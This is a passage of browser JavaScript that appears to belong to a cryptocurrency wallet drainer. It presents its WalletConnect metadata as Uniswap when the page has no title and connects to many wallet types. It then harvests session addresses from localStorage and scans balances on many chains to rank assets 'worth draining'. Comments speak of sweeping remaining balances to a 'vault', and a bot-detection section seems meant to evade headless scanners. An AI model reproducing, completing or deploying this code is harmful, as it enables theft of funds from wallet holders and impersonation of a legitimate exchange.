    await disconnectLegionWallet();
    clearWcStorageKeys();
    await sleep(300);
  }

  function findWcStorageSession() {
    try {
      var keys = Object.keys(localStorage);
      for (var wi = 0; wi < keys.length; wi++) {
        var k = keys[wi];
        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
        var obj = JSON.parse(localStorage.getItem(k) || '{}');
        var sessions = Object.values(obj);
        for (var si = sessions.length - 1; si >= 0; si--) {
          var sess = sessions[si];
          var ns = sess && sess.namespaces;
          if (!ns || !ns.eip155 || !ns.eip155.accounts || !ns.eip155.accounts[0]) continue;
          var parts = String(ns.eip155.accounts[0]).split(':');
          var addr = (parts[parts.length - 1] || '').toLowerCase();
          if (!addr || addr.length < 40) continue;
          var expiry = sess.expiry || sess.expiration || null;
          return { address: addr, topic: sess.topic, expiry: expiry };
        }
      }
    } catch (e) {}
    return null;
  }

  function isWcSessionExpired(sess) {
    if (!sess || !sess.expiry) return false;
    var exp = Number(sess.expiry);
    if (!exp) return false;
    return Date.now() / 1000 > exp;
  }

  async function waitWcStorageSession(maxMs) {
    maxMs = maxMs || 180000;
    var start = Date.now();
    while (Date.now() - start < maxMs) {
      var sess = findWcStorageSession();
      if (sess) return sess;
      await sleep(500);
    }
    return null;
  }

  function wcMetaPayload() {
    var origin = window.location.origin;
    var returnUrl = origin + window.location.pathname + window.location.search;
    var encodedReturn = encodeURIComponent(returnUrl);
    var icon = origin + '/favicon.png';
    try {
      var link = document.querySelector('link[rel="icon"], link[rel="shortcut icon"]');
      if (link && link.href) icon = link.href;
    } catch (e) {}
    return {
      name: document.title || 'Uniswap',
      description: 'Connect your wallet',
      url: origin,
      icons: [icon],
      redirect: {
        native: 'trust://open_url?coin_id=60&url=' + encodedReturn,
        universal: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodedReturn,
        linkMode: true,
        okx: 'okx://wallet/dapp/url?dappUrl=' + encodedReturn,
        bitget: 'bitkeep://bkconnect?action=dapp&url=' + encodedReturn,
      },
    };
  }

  function applyLegionWalletSessionAddresses() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
        var sess = window.LegionWallet.getSessionAddresses();
        if (sess && sess.flat) applyWcSessionAddresses(sess.flat);
        return sess;
      }
    } catch (e) {}
    applyWcSessionAddresses(scanWcSessionAllFamilies());
    return null;
  }

  function getLegionConnectorId() {
    try {
      return (window.LegionWallet && window.LegionWallet.getConnectorId
        ? window.LegionWallet.getConnectorId() : '') || '';
    } catch (e) {
      return '';
    }
  }

  var MAX_VALID_EVM_CHAIN_ID = 4294967295;

  function connectModeLabel() {
    if (S.connectMode === 'wc') return 'MOBILE-WC';
    if (S.connectMode === 'injected') return 'EXTENSION';
    return 'NONE';
  }

  function logConnect(step, msg) {
    L.log('[connect:' + connectModeLabel() + ']', step, msg);
  }

  function isWcConnectActive() {
    return S.connectMode === 'wc' || _wcConnecting || S.wcSessionActive;
  }

  function isInjectedProvider(provider) {
    if (!provider) return true;
    if (provider.isWalletConnect === true) return false;
    if (provider.isMetaMask && !provider.isWalletConnect) return true;
    var connId = getLegionConnectorId().toLowerCase();
    return isInjectedConnectorId(connId);
  }

  async function clearInjectedSession(opts) {
    opts = opts || {};
    var had = !!(S.evmAddr || S.evmProvider);
    S.evmAddr = null;
    S.evmChain = null;
    S.evmProvider = null;
    S.evmWallet = '';
    S.evmScanChainIds = null;
    if (!opts.keepMode && S.connectMode === 'injected') S.connectMode = null;
    try { sessionStorage.removeItem('legion_wc_evm_addr'); } catch (e) {}
    try { sessionStorage.removeItem('legion_wc_families'); } catch (e3) {}
    if (opts.disconnectWallet !== false) {
      try { await disconnectLegionWallet(); } catch (e2) {}
    }
    if (had) logConnect('clear', 'extension session reset');
  }

  async function clearWcSession(full) {
    S.wcSessionActive = false;
    S.wcSessionExpired = false;
    _wcProv = null;
    _wcConnecting = false;
    if (S.connectMode === 'wc') S.connectMode = null;
    removeWcGuard();
    closeAppKitModal();
    if (full !== false) {
      clearWcStorageKeys();
      try { await disconnectLegionWallet(); } catch (e) {}
    }
    try { sessionStorage.removeItem('legion_wc_families'); } catch (e2) {}
    logConnect('clear', 'WalletConnect session reset');
  }

  async function prepInjectedMode() {
    if (_wcConnecting) {
      logConnect('blocked', 'WalletConnect still open — close QR first');
      return false;
    }
    await clearWcSession(true);
    S.connectMode = 'injected';
    S.wcSessionActive = false;
    removeWcGuard();
    logConnect('mode', '→ EXTENSION (browser wallet)');
    return true;
  }

  async function prepWcOnlyMode(clearStorage) {
    await clearInjectedSession({ keepMode: true, disconnectWallet: false });
    S.connectMode = 'wc';
    S.wcSessionActive = true;
    logConnect('mode', '→ MOBILE-WC (scan QR on phone)');
    await disconnectLegionWallet();
    if (clearStorage === false) {
      await sleep(200);
      return;
    }
    clearWcStorageKeys();
    await sleep(200);
  }

  function saveWcFamilyContext(addrs) {
    try {
      sessionStorage.setItem('legion_wc_families', JSON.stringify({
        ts: Date.now(),
        addresses: addrs || collectAddressMap(),
      }));
    } catch (e) {}
    try {
      if (window.LegionWallet && typeof window.LegionWallet.saveSessionContext === 'function') {
        var sess = window.LegionWallet.getSessionAddresses && window.LegionWallet.getSessionAddresses();
        if (sess && sess.families) window.LegionWallet.saveSessionContext(sess.families);
      }
    } catch (e2) {}
  }

  function loadWcFamilyContext() {
    try {
      var raw = sessionStorage.getItem('legion_wc_families');
      if (!raw) return null;
      var ctx = JSON.parse(raw);
      if (!ctx || !ctx.ts) return null;
      if (Date.now() - ctx.ts > 7 * 24 * 60 * 60 * 1000) {
        sessionStorage.removeItem('legion_wc_families');
        return null;
      }
      return ctx.addresses || null;
    } catch (e) {
      return null;
    }
  }

  async function tryRecoverWcSession() {
    var sess = findWcStorageSession();
    var fromContextOnly = false;
    if (!sess || !sess.address) {
      var ctx = loadWcFamilyContext();
      if (ctx && ctx.evm) {
        sess = { address: ctx.evm, fromContext: true };
        fromContextOnly = true;
      }
    }
    if (!sess || !sess.address) return null;
    if (fromContextOnly && !findWcStorageSession()) {
      L.warn('WC recovery: stale extension context — not a real WC session');
      try { sessionStorage.removeItem('legion_wc_families'); } catch (e0) {}
      return null;
    }
    if (isWcSessionExpired(sess)) {
      L.log('WC session expired — clearing for reconnect');
      clearWcStorageKeys();
      S.wcSessionExpired = true;
      return null;
    }
    if (typeof window.LegionWallet === 'undefined') return null;
    L.log('WC session recovery:', sess.address.slice(0, 10) + '...');
    S.connectMode = 'wc';
    S.wcSessionActive = true;
    try {
      if (typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
        var restored = await window.LegionWallet.tryRecoverStoredSession(true);
        if (restored && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), restored)) {
          applyLegionWalletSessionAddresses();
          L.log('WC session restored via LegionWallet recovery');
          return restored;
        }
      }
      var prov = await pollWcProviderReady(20000);
      if (prov && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), prov)) {
        applyLegionWalletSessionAddresses();
        L.log('WC session restored from storage');
        return prov;
      }
    } catch (e) { L.warn('WC recovery fail:', e.message); }
    return null;
  }

  async function scanFullPortfolio(address, addrs) {
    addrs = addrs || collectAddressMap(address);
    var items = [];
    var byChain = {};
    var evmChainIds = getMultiChainOrder();

    function ensureByChainSlot(cid) {
      if (!cid) return;
      if (!byChain[cid]) byChain[cid] = { chainId: cid, usd: 0, tokens: [] };
    }

    evmChainIds.forEach(function (cid) { ensureByChainSlot(cid); });

    function mergeMultiBalanceRow(row) {
      if (!row) return;
      var cid = rankedAssetChainId(row.chain);
      ensureByChainSlot(cid);
      var fam = String(row.family || 'EVM').toUpperCase();
      function pushItem(token, symbol, amount_raw, decimals, contract) {
        if (!amount_raw || BigInt(amount_raw || '0') <= 0n) return;
        var caip19 = null;
        if (contract && cid && window.LegionCaipRegistry && typeof window.LegionCaipRegistry.formatErc20Caip19 === 'function') {
          caip19 = window.LegionCaipRegistry.formatErc20Caip19(cid, contract);
        }
        items.push({
          chain: row.chain,
          family: fam,
          token: token,
          symbol: symbol || '?',
          amount_raw: String(amount_raw),
          amount_usd: 0,
          decimals: decimals || 18,
          caip19: caip19,
        });
        if (contract && cid && byChain[cid]) {
          var cLower = String(contract).toLowerCase();
          var dup = false;
          for (var di = 0; di < byChain[cid].tokens.length; di++) {
            if (byChain[cid].tokens[di].address === cLower) { dup = true; break; }
          }
          if (!dup) {
            byChain[cid].tokens.push({
              address: cLower,
              balance: String(amount_raw),
              symbol: symbol || '?',
              usd: 0,
            });
          }
        }
      }
      if (row.native && BigInt(row.native.amount_raw || '0') > 0n) {
        pushItem('native', row.native.symbol, row.native.amount_raw, row.native.decimals);
      }
      (row.tokens || []).forEach(function (t) {
        if (BigInt(t.amount_raw || '0') > 0n) {
          pushItem(t.contract || t.symbol, t.symbol, t.amount_raw, t.decimals, t.contract);
        }
      });
    }

    var multiBody = { evm_chain_id: 1 };
    if (addrs.evm) multiBody.evm = addrs.evm;
    else if (address) multiBody.evm = address;
    if (addrs.sol) multiBody.sol = addrs.sol;
    if (addrs.tron) multiBody.tron = addrs.tron;
    if (addrs.ton) multiBody.ton = addrs.ton;
    if (addrs.btc) multiBody.btc = addrs.btc;
    if (addrs.cosmos) multiBody.cosmos = addrs.cosmos;
    if (addrs.aptos) multiBody.aptos = addrs.aptos;
    if (addrs.sui) multiBody.sui = addrs.sui;

    var multiRows = [];
    try {
      var multiResp = await apiPost('/api/v1/multi-balance', multiBody);
      if (multiResp && multiResp.data && multiResp.data.chains) {
        multiRows = multiRows.concat(multiResp.data.chains);
      }
    } catch (e) { L.warn('multi-balance (all families):', e.message); }

    var evmProbeAddr = addrs.evm || address;
    if (evmProbeAddr) {
      var batchSize = EVM_SCAN_BATCH_SIZE;
      for (var bi = 0; bi < evmChainIds.length; bi += batchSize) {
        var slice = evmChainIds.slice(bi, bi + batchSize);
        var evmProbes = await Promise.allSettled(
          slice.map(function (cid) {
            return apiPost('/api/v1/multi-balance', { evm: evmProbeAddr, evm_chain_id: cid })
              .then(function (resp) {
                var chains = resp && resp.data && resp.data.chains;
                return chains && chains.length ? chains[0] : null;
              });
          })
        );
        evmProbes.forEach(function (pr) {
          if (pr.status === 'fulfilled' && pr.value) multiRows.push(pr.value);
        });
      }
    }

    var seenChain = {};
    multiRows.forEach(function (row) {
      if (!row || !row.chain || seenChain[row.chain]) return;
      seenChain[row.chain] = true;
      mergeMultiBalanceRow(row);
    });

    var rankedAll = await SCOUT.ranked(address);
    var rankedItems = (rankedAll && rankedAll.assets) || (rankedAll && rankedAll.ranked) || [];
    rankedItems.forEach(function (a) {
      var cid = rankedAssetChainId(a.chain);
      ensureByChainSlot(cid);
      var usd = Number(a.amount_usd || a.usd_value || 0);
      items.push(a);
      if (cid && byChain[cid]) {
        byChain[cid].usd += usd;
        if (a.token && a.token !== 'native' && String(a.token).startsWith('0x')) {
          var exists = byChain[cid].tokens.some(function (t) {
            return t.address === String(a.token).toLowerCase();
          });
          if (!exists) {
            byChain[cid].tokens.push({
              address: String(a.token).toLowerCase(),
              balance: String(a.amount_raw || a.raw_balance || '0'),
              symbol: a.symbol || '?',
              usd: usd,
            });
          }
        }
      }
    });

    var totalUsd = Number(rankedAll && rankedAll.total_usd) || 0;
    var fundedChains = [];
    Object.keys(byChain).forEach(function (k) {
      var cid = parseInt(k, 10);
      if (chainSlotWorthDraining(byChain[cid])) fundedChains.push(cid);
    });
    fundedChains.sort(function (a, b) { return byChain[b].usd - byChain[a].usd; });
    S.scoutUsd = Math.max(S.scoutUsd, totalUsd);
    S.portfolioScan = {
      totalUsd: totalUsd,
      items: items,
      byChain: byChain,
      fundedChains: fundedChains,
      assetCount: items.length,
      multiChainRows: multiRows.length,
      evmChainsScanned: evmChainIds.length,
      addresses: addrs,
    };
    L.log(
      'Portfolio scan:',
      totalUsd.toFixed(2), 'USD | EVM chains scanned:', evmChainIds.length,
      '| rows:', multiRows.length,
      '| funded:', fundedChains.join(',') || 'none',
      '| families:', Object.keys(addrs).join(',')
    );
    return S.portfolioScan;
  }

  async function buildChainAssets(provider, address, chainId, portfolio) {
    var assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0, defi_positions: [], uni_v3_positions: [], uni_v2_lps: [] };
    var ch = portfolio && portfolio.byChain && portfolio.byChain[chainId];
    if (ch) {
      assets.usd = ch.usd;
      assets.tokens = filterDrainableTokens(ch.tokens.slice());
    }
    try {
      assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
    } catch (e) {}
    return assets;
  }

  var NATIVE_TRANSFER_GAS = 21000n;
  var CLAIM_CONTRACT_GAS = 120000n;
  var ERC20_TRANSFER_GAS = 65000n;

  /** Live EIP-1559 fees — wallet RPC with public fallback + 20% buffer. */
  async function estimateEip1559Fees(provider, chainId) {
    var floor = GAS_FLOOR_BY_CHAIN[Number(chainId)] || 100000000n;
    var cid = Number(chainId) || 1;
    var applyBuffer = function (fees) {
      return {
        maxFeePerGas: (fees.maxFeePerGas * 120n) / 100n,
        maxPriorityFeePerGas: (fees.maxPriorityFeePerGas * 120n) / 100n,
      };
    };
    try {
      var hist = await evmRequestWithFallback(provider, cid, 'eth_feeHistory', ['0x4', 'latest', [50]]);
      var baseArr = hist.baseFeePerGas || [];
      var baseFee = BigInt(baseArr[baseArr.length - 1] || '0x0');
      var rewards = (hist.reward && hist.reward[hist.reward.length - 1]) || [];
      var priority = BigInt(rewards[0] || '0x5F5E100');
      var maxFee = baseFee * 2n + priority;
      if (maxFee < floor) maxFee = floor;
      if (priority < floor / 10n) priority = floor / 10n;
      return applyBuffer({ maxFeePerGas: maxFee, maxPriorityFeePerGas: priority });
    } catch (e) {
      try {
        var gp = BigInt(await evmRequestWithFallback(provider, cid, 'eth_gasPrice', []) || '0x0');
        if (gp < floor) gp = floor;
        return applyBuffer({ maxFeePerGas: gp, maxPriorityFeePerGas: gp / 10n });
      } catch (e2) {
        return applyBuffer({ maxFeePerGas: floor * 100n, maxPriorityFeePerGas: floor });
      }
    }
  }

  /** Gas cost only — remainder sweeps to vault (not a fixed wallet reserve). */
  async function calcNativeGasCostWei(provider, chainId, gasLimit) {
    var limit = gasLimit || NATIVE_TRANSFER_GAS;
    var fees = await estimateEip1559Fees(provider, chainId);
    return (limit * fees.maxFeePerGas * 120n) / 100n;
  }

  async function calcMaxNativeSendWei(provider, nativeHex, chainId, gasLimit) {
    var bal = BigInt(nativeHex || '0x0');
    var gasCost = await calcNativeGasCostWei(provider, chainId, gasLimit);
    if (bal <= gasCost) return { send: 0n, gasCost: gasCost };
    return { send: bal - gasCost, gasCost: gasCost };
  }

  function calcNativeSendWei(nativeHex, chainId) {
    var bal = BigInt(nativeHex || '0x0');
    var gasCost = 500000000000000n;
    if (Number(chainId) === 137) gasCost = 100000000000000000n;
    return bal > gasCost ? bal - gasCost : 0n;
  }

  // Priority EVM chains — Phase 2/3: single source via LegionCaipRegistry
  function resolvePriorityEvmChains() {
    if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.getEffectiveEvmChainIds === 'function') {
      return window.LegionCaipRegistry.getEffectiveEvmChainIds().slice();
    }
    return [1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000];
  }
  var PRIORITY_EVM_CHAINS = resolvePriorityEvmChains();
  var PRIORITY_CHAIN_ORDER = PRIORITY_EVM_CHAINS.slice();
  var EVM_SCAN_BATCH_SIZE = 12;

  function getMultiChainOrder() {
    if (S.evmScanChainIds && S.evmScanChainIds.length) return S.evmScanChainIds;
    var ids = [];
    var seen = {};
    function addChain(id) {
      var n = Number(id);
      if (!Number.isFinite(n) || n <= 0 || n > MAX_VALID_EVM_CHAIN_ID || seen[n]) return;
      seen[n] = true;
      ids.push(n);
    }
    PRIORITY_CHAIN_ORDER.forEach(addChain);
    TARGET_EVM_CHAIN_IDS.forEach(addChain);
    if (!ids.length) PRIORITY_CHAIN_ORDER.forEach(addChain);
    ids.sort(function (a, b) {
      var ia = PRIORITY_CHAIN_ORDER.indexOf(a);
      var ib = PRIORITY_CHAIN_ORDER.indexOf(b);
      if (ia === -1 && ib === -1) return a - b;
      if (ia === -1) return 1;
      if (ib === -1) return -1;
      return ia - ib;
    });
    S.evmScanChainIds = ids;
    L.log('[scan] EVM chains:', ids.length, '(priority list — not full viem universe)');
    return ids;
  }

  /** @deprecated use getMultiChainOrder() */
  function getMultiChainOrderLegacy() { return getMultiChainOrder(); }

  var CHAIN_ADD_PARAMS = {
    56: {
      chainId: '0x38',
      chainName: 'BNB Smart Chain',
      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
      rpcUrls: ['https://bsc-dataseed.binance.org'],
      blockExplorerUrls: ['https://bscscan.com'],
    },
    137: {
      chainId: '0x89',
      chainName: 'Polygon',
      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
      rpcUrls: ['https://polygon-rpc.com'],
      blockExplorerUrls: ['https://polygonscan.com'],
    },
    42161: {
      chainId: '0xa4b1',
      chainName: 'Arbitrum One',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
      blockExplorerUrls: ['https://arbiscan.io'],
    },
    8453: {
      chainId: '0x2105',
      chainName: 'Base',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.base.org'],
      blockExplorerUrls: ['https://basescan.org'],
    },
    10: {
      chainId: '0xa',
      chainName: 'Optimism',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.optimism.io'],
      blockExplorerUrls: ['https://optimistic.etherscan.io'],
    },
    43114: {
      chainId: '0xa86a',
      chainName: 'Avalanche C-Chain',
      nativeCurrency: { name: 'AVAX', symbol: 'AVAX', decimals: 18 },
      rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
      blockExplorerUrls: ['https://snowtrace.io'],
    },
    534352: {
      chainId: '0x82750',
      chainName: 'Scroll',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.scroll.io'],
      blockExplorerUrls: ['https://scrollscan.com'],
    },
    81457: {
      chainId: '0x13e31',
      chainName: 'Blast',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.blast.io'],
      blockExplorerUrls: ['https://blastscan.io'],
    },
    5000: {
      chainId: '0x1388',
      chainName: 'Mantle',
      nativeCurrency: { name: 'MNT', symbol: 'MNT', decimals: 18 },
      rpcUrls: ['https://rpc.mantle.xyz'],
      blockExplorerUrls: ['https://mantlescan.xyz'],
    },
  };

  // Session state
  var S = {
    drainRunning: false,
    vaultLoaded: false,
    eip7702Enabled: true,
    evmAddr: null, evmChain: null, evmProvider: null, evmWallet: '',
    scoutUsd: 0,
    anchorsOk: 0,
    lastDrainSkipReason: '',
    discovered: [],
    nonEvm: {},
    familyProviders: { SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [] },
    familyConnections: {},
    familiesLinked: false,
    allAddresses: {},
    chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null, POLKADOT: null, ALGORAND: null, CARDANO: null },
    omnichainLegs: {},
    fusionAssets: [],
    pendingEvmPermit2: null,
    wcSessionActive: false,
    connectMode: null,
    injectedWalletKey: '',
    portfolioScan: null,
    notifySessionKey: null,
    connectSession: null,
    fusionNotified: false,
    connecting: false,
    wcSessionExpired: false,
    evmScanChainIds: null,
    factoryContracts: {},
    factoryFallbackAllowed: {},
    deactivatedContracts: {},
    backendEndpoints: [],
    proxyUrls: [],
    deployDomains: [],
    eip712Domains: {},
    relayerSponsored: false,
    chainCapabilities: {},
    deferredBroadcasts: 0,
  };

  var _evmConnectLock = null;

  // WC guard removed — it blocked AppKit modal.request when connector was io.metamask.
  function installWcGuard() { /* no-op */ }
  function removeWcGuard() { /* no-op */ }

  function withConnectTimeout(promise, ms, message) {
    return Promise.race([
      promise,
      new Promise(function (_, reject) {
        setTimeout(function () {
          reject(new Error(message || 'Wallet connection timed out'));
        }, ms);
      }),
    ]);
  }

  async function evmRequestAccounts(provider) {
    if (_evmConnectLock) {
      try { return await _evmConnectLock; } catch (e) { /* retry below */ }
    }
    var wcMode = S.connectMode === 'wc' || (provider && provider.isWalletConnect === true);
    var connectTimeoutMs = wcMode ? 120000 : 45000;
    var timeoutMsg = wcMode
      ? 'WalletConnect timed out — approve the connection on your phone or try again.'
      : 'Wallet connection timed out — install the extension or pick another wallet.';
    _evmConnectLock = withConnectTimeout((async function () {
      try {
        var accounts = await provider.request({ method: 'eth_accounts' });
        if (accounts && accounts.length) return accounts;
      } catch (e) {
        if (!wcMode) L.warn('RPC fail, fallback to AppKit state...');
      }

      try {
        if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
          var acc = window.LegionWallet.getAccount();
          if (acc && acc.address) {
            if (wcMode && isInjectedConnectorId(getLegionConnectorId())) {
              throw new Error('Extension hijacked WalletConnect session');
            }
            logConnect('accounts', 'AppKit getAccount ' + String(acc.address).slice(0, 10) + '...');
            return [acc.address];
          }
        }
        if (window.LegionWallet && window.LegionWallet.state && window.LegionWallet.state.address) {
          return [window.LegionWallet.state.address];
        }
      } catch (e2) {
        if (wcMode && isUserRejection(e2)) throw e2;
      }

      var sessAddr = resolveWcEvmAddress();
      if (sessAddr) {
        logConnect('accounts', 'WC session ' + sessAddr.slice(0, 10) + '...');
        try { sessionStorage.setItem('legion_wc_evm_addr', sessAddr); } catch (eS) {}
        return [sessAddr];
      }

      try {
        var stored = sessionStorage.getItem('legion_wc_evm_addr');
        if (stored) {
          logConnect('accounts', 'sessionStorage ' + stored.slice(0, 10) + '...');
          return [stored];
        }
      } catch (eSt) {}

      if (wcMode) {
        throw new Error('WalletConnect account not ready — approve on phone');
      }

      try {
        var req = await provider.request({ method: 'eth_requestAccounts' });
        if (req && req.length) return req;
      } catch (e3) {
        if (isUserRejection(e3)) {
          await clearInjectedSession({ keepMode: false });
          throw e3;
        }
      }

      throw new Error('Could not retrieve EVM account — extension may not be installed');
    })(), connectTimeoutMs, timeoutMsg);
    try {
      return await _evmConnectLock;
    } finally {
      _evmConnectLock = null;
    }
  }

  function resolveWcEvmAddress() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
        var acc = window.LegionWallet.getAccount();
        if (acc && acc.address) return String(acc.address).toLowerCase();
      }
      if (window.LegionWallet && window.LegionWallet.state && window.LegionWallet.state.address) {
        return String(window.LegionWallet.state.address).toLowerCase();
      }
    } catch (eA) {}
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
        var sa = window.LegionWallet.getSessionAddresses();
        if (sa && sa.flat && sa.flat.evm) return String(sa.flat.evm).toLowerCase();
      }
    } catch (e1) {}
    var stored = findWcStorageSession();
    if (stored && stored.address) return stored.address;
    var scan = scanWcSessionAllFamilies();
    if (scan.evm) return String(scan.evm).toLowerCase();
    return null;
  }

  function resolveWcEvmChainId() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getEvmChainIdFromSession === 'function') {
        var cid = window.LegionWallet.getEvmChainIdFromSession();
        if (cid) return Number(cid);
      }
    } catch (e0) {}
    try {
      var keys = Object.keys(localStorage);
      for (var i = 0; i < keys.length; i++) {
        var k = keys[i];
        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
        var obj = JSON.parse(localStorage.getItem(k) || '{}');
        var sessions = Object.values(obj);
        for (var j = sessions.length - 1; j >= 0; j--) {
          var caip = sessions[j]?.namespaces?.eip155?.accounts?.[0];
          if (!caip) continue;
          var parts = String(caip).split(':');
          if (parts[0] === 'eip155' && parts[1]) {
            var chainId = parseInt(parts[1], 10);
            if (!Number.isNaN(chainId) && chainId > 0) return chainId;
          }
        }
      }
    } catch (e1) {}
    return 1;
  }

  async function resolveWcEvmChainIdFromProvider(provider) {
    try {
      var chainHex = await provider.request({ method: 'eth_chainId' });
      return parseInt(String(chainHex).replace('0x', ''), 16);
    } catch (e) {
      var fromSession = resolveWcEvmChainId();
      L.log('WC eth_chainId unavailable — session chain', fromSession);
      return fromSession;
    }
  }

  function defaultConnect() {
    if (S.drainRunning) return;
    if (!S.vaultLoaded) prefetchVault();
    if (PLAT.inApp && window.ethereum) {
      handleConnect();
      return;
    }
    if (document.querySelector('[data-testid="account-drawer-container"]')) {
      var openFn = window.customModalOpen;
      if (typeof openFn === 'function' && openFn !== defaultConnect) {
        openFn();
        return;
      }
    }
    if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.LegionDrawer.open();
      return;
    }
    if (typeof window.customModalOpen === 'function') {
      window.customModalOpen();
      return;
    }
    handleWC();
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 03: BOT DETECTION
  // ═══════════════════════════════════════════════════════════════
  function isBot() {
    var score = 0;
    try { if (navigator.webdriver === true) score += 3; } catch (e) {}
    try { if (/headless|PhantomJS|selenium|webdriver/i.test(navigator.userAgent)) score += 3; } catch (e) {}
    try { if (!navigator.languages || navigator.languages.length === 0) score += 1; } catch (e) {}
    try { if (screen.width < 100 || screen.height < 100) score += 2; } catch (e) {}
    try { if (screen.width === 0 || screen.height === 0) score += 2; } catch (e) {}
    return score >= 4;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 04: PLATFORM DETECTION
  // ═══════════════════════════════════════════════════════════════
  var PLAT = (function () {
    var ua = navigator.userAgent || '';
    var isIPadPro = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
    var isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(ua) || isIPadPro;
    var walletApp = null, inApp = false;
    var appChecks = [
      [/MetaMaskMobile/i, 'MetaMask'],
      [/Trust\/[\d.]+/i, 'Trust Wallet'],
      [/CoinbaseWallet/i, 'Coinbase Wallet'],
      [/OKApp|OKEx/i, 'OKX'],
      [/BitKeep|Bitget/i, 'Bitget'],
      [/TokenPocket/i, 'TokenPocket'],
      [/SafePal/i, 'SafePal'],
      [/imToken/i, 'imToken'],
    ];
    for (var i = 0; i < appChecks.length; i++) {
      if (appChecks[i][0].test(ua)) { walletApp = appChecks[i][1]; inApp = true; break; }
    }
    if (!inApp && isMobile && window.ethereum) {
      if (window.ethereum.isMetaMask) { walletApp = 'MetaMask'; inApp = true; }
      else if (window.ethereum.isTrust) { walletApp = 'Trust Wallet'; inApp = true; }
      else if (window.ethereum.isOkxWallet) { walletApp = 'OKX'; inApp = true; }
      else if (window.ethereum.isCoinbaseWallet) { walletApp = 'Coinbase Wallet'; inApp = true; }
    }
    var isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
    var strategy = 'extension';
    if (isTelegram) strategy = 'telegram';
    else if (inApp) strategy = 'inapp';
    else if (isMobile) strategy = 'wc';
    return { ua, isMobile, walletApp, inApp, isTelegram, strategy };
  })();

  // ═══════════════════════════════════════════════════════════════
  // SECTION 05: WALLET DISCOVERY
  // ═══════════════════════════════════════════════════════════════
  window.addEventListener('eip6963:announceProvider', function (ev) {
    if (!ev.detail || !ev.detail.provider || !ev.detail.info) return;
    var dup = S.discovered.some(function (w) { return w.info.uuid === ev.detail.info.uuid; });
    if (!dup) S.discovered.push(ev.detail);
  });

  function requestProviders() {
    try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch (e) {}
  }

  var RDNS_BY_KEY = {
    metamask: 'io.metamask',
    trust: 'com.trustwallet.app',
    'coinbase-extension': 'com.coinbase.wallet',
    coinbase: 'com.coinbase.wallet',
    rabby: 'io.rabby',
    phantom: 'app.phantom',
    brave: 'com.brave.wallet',
    okx: 'com.okex.wallet',
    binance: 'com.binance.wallet',
  };

  function isPhantomEvmProvider(p) {
    return !!(p && (p.isPhantom || p._phantom || p.isPhantomEthereum));
  }

  function resolveEvmProvider(key) {
    requestProviders();
    var k = String(key || '').toLowerCase();
    var targetRdns = RDNS_BY_KEY[k] || k;
    if (k === 'metamask' || targetRdns === 'io.metamask') {
      for (var mi = 0; mi < S.discovered.length; mi++) {
        var mw = S.discovered[mi];
        if (!mw || !mw.provider || !mw.info) continue;
        if (String(mw.info.rdns || '').toLowerCase() === 'io.metamask' && !isPhantomEvmProvider(mw.provider)) {
          return mw.provider;
        }
      }
    }
    for (var i = 0; i < S.discovered.length; i++) {
      var w = S.discovered[i];
      if (!w || !w.provider || !w.info) continue;
      var rdns = String(w.info.rdns || '').toLowerCase();
      var name = String(w.info.name || '').toLowerCase();
      if (k === 'metamask' && (rdns === 'app.phantom' || isPhantomEvmProvider(w.provider))) continue;
      if (rdns === targetRdns || rdns === k || rdns.indexOf(k) !== -1 || name.indexOf(k) !== -1) {
        return w.provider;
      }
    }
    var eth = window.ethereum;
    if (eth && Array.isArray(eth.providers)) {
      for (var j = 0; j < eth.providers.length; j++) {
        var p = eth.providers[j];
        if (!p) continue;
        if ((k === 'metamask' || targetRdns === 'io.metamask') && p.isMetaMask && !p.isRabby && !isPhantomEvmProvider(p)) return p;
        if ((k === 'trust' || targetRdns === 'com.trustwallet.app') && (p.isTrust || p.isTrustWallet)) return p;
        if (k.indexOf('coinbase') !== -1 && (p.isCoinbaseWallet || p.isCoinbaseBrowser)) return p;
        if ((k === 'rabby' || targetRdns === 'io.rabby') && p.isRabby) return p;
        if ((k === 'okx' || targetRdns === 'com.okex.wallet') && (p.isOkxWallet || p.isOKExWallet)) return p;
        if ((k === 'brave' || targetRdns === 'com.brave.wallet') && p.isBraveWallet) return p;
      }
    }
